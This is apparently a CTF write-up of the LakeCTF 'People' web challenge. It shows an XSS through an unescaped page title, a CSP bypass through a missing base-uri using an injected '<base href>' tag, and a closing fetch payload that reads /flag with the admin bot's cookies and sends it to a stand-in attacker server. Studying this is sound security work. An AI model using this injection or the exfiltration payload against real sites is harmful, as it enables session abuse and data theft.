---
layout: post
title: LakeCTF Qualifications People (Web) Writeup
tags: [ctf, ctf writeup]
---

*Note: Some of the links to external sites about the challenge in this post might become unavailable in the future.*

This is my writeup to web challenge "[People](https://ctf.polygl0ts.ch/challenges#People-18)" in [LakeCTF](https://ctf.polygl0ts.ch/) Qualifications round. LakeCTF is orgnised by EPFL's CTF team [polygl0ts](https://polygl0ts.ch/). This challenge is solved by 36 teams out of 191 teams scored at least 1 point on the scoreboard. In this challenge I exploited XSS and improper configuration of CSP, more specifically omitting `base-uri`.

The challenge has a downloadable. Examining the code and the application, users can signup a profile with bio and other information, as well as logging in. Upon logging in, user is redirected to their profile page where user information is shown. Users can also report their profile, resulting in the profile page being visited by an admin bot.

This type of web challenges with a bot visiting the page normally involves in exploiting cross-site scripting (XSS).

It appears that it is likely the XSS is on the profile page that the bot visits, and the page displays user information stored in the database. We set the information of the user when signing up the user, however, the signup endpoint is rate limited, so we cannot test many payload through that endpoint on the live website. There is another `/edit` endpoint which also enables us to update user information, and there is no rate limit on that endpoint, so we could conveniently test different input on the live website without setting up our own docker container.

Our team managed to quickly find the potential injection point on the profile page. Despite the input are escaped when rendering the page, we noticed that the title also shows data from the database, and the code does not escape it:

{% raw %}
```html
{% set description = '%s at %s' % (user['title'], user['lab']) %}
{% block title %}{{user['fullname']}} | {{description|safe}}{% endblock %}
```
{% endraw %}

As shown above, the `safe` filter in the template disables escaping. Thus, we managed to put HTML and JavaScript code into the webpage.

## Bypass CSP

Despite we have managed to inject new tags and code, we could still not make the browser to execute our XSS code. This is because the app sets `Content-Security-Policy` HTTP header that only script tags with the defined nonce would run.

However, the CSP did not define `base-uri`, and two of the `<script>` tags on the profile page did not use full URL:

```html
<script src="/static/js/marked.min.js" nonce="qvAsaTf6Pe8F101A71nf7vOt1lktIAiK"></script>
<script src="/static/js/purify.min.js" nonce="qvAsaTf6Pe8F101A71nf7vOt1lktIAiK"></script>
```

Conveniently, the XSS injection point is in `<title>`, which is in `<head>`, thus we are able to define new base:

```html
<base href="https://my-server.example.com">
```

This will result in one of the script on the profile page to load from `https://my-server.example.com/static/js/marked.min.js` and execute.

The final info we set to user's title in their profile is `</title><base href="https://my-server.example.com"></head>`, and we serve the JavaScript payload at `https://my-server.example.com/static/js/marked.min.js`.

## Getting the Flag

Now we are able to make the profile page to pop an alert of whatever we put in the JavaScript file. However our goal is to steal the flag. The flag is accessible through the `/flag` endpoint in the webapp. The endpoint checks for `admin_token` in cookies. We might want to steal the cookies first, however, when the admin bot visits the webpage, their cookie is set to `httpOnly`, so we cannot use XSS to get the cookie. As getting the flag is our only goal, we can workaround by using `fetch` API or XMLHttpRequest. As when doing such request on the same site, cookies are sent, and flag will be retrieved.

Our final JavaScript for getting the flag and exfil is:

```javascript
fetch("http://web:8080/flag")
    .then((response) => response.text())
    .then((data) => fetch("https://my-server.example.com/xss?" + data));
```
